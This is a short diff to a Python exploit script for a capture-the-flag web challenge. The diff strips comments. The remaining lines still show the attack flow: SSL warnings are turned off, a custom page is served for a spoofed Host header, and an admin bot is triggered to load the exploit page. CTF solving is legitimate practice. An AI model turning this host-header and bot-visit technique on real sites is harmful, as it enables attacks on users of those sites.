@@ -88,8 +88,7 @@ import urllib3
 # Disable SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Target configuration
-TARGET = "https://web-extension-mania-p0ecf2s3.smiley.cat"  # Change to remote URL if needed
+TARGET = "https://web-extension-mania-p0ecf2s3.smiley.cat" 
 FLAG_HOST = "coolctfgames.localhost"
 PORT = 3000
 
@@ -310,9 +309,6 @@ def exploit():
     # Wait a bit for the update to take effect
     time.sleep(2)
     
-    # The key insight: We need to make the bot visit the ACTUAL correct origin
-    # Since the server serves our custom HTML when the Host header matches FLAG_HOST,
-    # the bot will load our exploit page when visiting the correct URL
     bot_url = f"http://{FLAG_HOST}:{PORT}/"
     
     print(f"[*] Step 2: Triggering bot with correct origin URL: {bot_url}")
